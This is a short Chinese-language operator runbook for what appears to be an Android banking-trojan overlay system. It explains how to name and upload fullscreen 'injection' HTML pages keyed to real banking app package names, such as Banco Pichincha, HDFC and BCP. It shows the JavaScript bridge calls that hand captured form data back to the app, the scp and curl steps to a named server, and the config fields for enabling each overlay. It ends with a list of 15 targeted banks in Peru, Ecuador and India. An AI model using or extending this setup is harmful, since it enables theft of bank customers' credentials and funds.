# 注入页：命名规范与上线步骤

## 1. 文件命名

```
materials/inject/<国家前缀>_<包名>.html
  ec_com.yellowpepper.pichincha.html       厄瓜多尔 Banco Pichincha
  in_com.snapwork.hdfc.html                印度 HDFC
  peru_com.bcp.bank.bcp.html               秘鲁 BCP
```

前缀：`peru_` / `ec_` / `in_`（仅用于区分，实际以 DB 里的 template_url 为准）。

## 2. 页面协议（必须）

```js
Android.returnResult(JSON.stringify({...}))   // 主协议
FKB.setFormData(...) / FKB.setClosePage(...)  // 兼容旧壳
```

3.2 的注入页两种桥都注册了，页面里调用任一即可。

## 3. 上服务器

```bash
scp materials/inject/<file>.html root@<host>:/www/wwwroot/yk4.jk92.cc/source/materials/inject/
# 不需要重启服务：文件走静态/路由直接读
curl -sI https://yk4.jk92.cc/inject/file/<file>.html | head -1     # 期望 200
```

## 4. 写注入配置（inject_settings）

| 字段 | 说明 |
|---|---|
| package_name | 目标 App 包名 |
| app_name | 面板显示名 |
| template_url | `https://yk4.jk92.cc/inject/file/<file>.html` |
| **country** | **必须用面板的国家 code**（见下表），不是 ISO 大写码 |
| category | `bank` / `banking` / `payment` |
| enabled | 1 |
| fullscreen | 1 |

⚠️ 踩过的坑：写成 `EC` / `IN` 时面板卡片显示「0/0 已开启」，
因为面板按 `country==='ecuador'` 之类的 code 分组。已统一改为小写国家名。

面板支持的国家 code（部分）：

```
peru 秘鲁 · ecuador 厄瓜多尔 · colombia 哥伦比亚 · chile 智利 · mexico 墨西哥
india 印度 · panama 巴拿马 · bolivia 玻利维亚 · argentina 阿根廷
guatemala 危地马拉 · uae 阿联酋 · saudiarabia 沙特 · egypt 埃及 · morocco 摩洛哥
```

## 5. 当前线上清单（15 条）

| 国家 | 数量 | 备注 |
|---|---|---|
| peru | 8 | Yape / BCP / BBVA ×2 / Interbank ×3 / Scotiabank |
| ecuador | 2 | Pichincha（com.yellowpepper.pichincha）、Pacífico（com.pacifico.bancamovil，待实机核对） |
| india | 5 | Axis / Baroda / Canara ×2 / HDFC |
